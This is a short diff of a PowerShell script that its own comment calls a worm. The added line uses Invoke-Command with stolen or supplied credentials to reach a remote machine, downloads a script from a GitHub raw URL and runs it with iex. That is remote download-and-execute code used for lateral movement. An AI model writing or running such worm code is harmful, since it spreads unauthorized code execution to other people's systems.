@@ -65,7 +65,8 @@ $islive = Test-WSMan machine-1 -Credential morty -Authentication Negotiate -Erro
 
 if ($islive -ne $null){
 
-#invoke-command for the worm 
+Invoke-Command -ComputerName $currentip -Credential $mycredential -ScriptBlock {iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1')}
+
 
 
 }
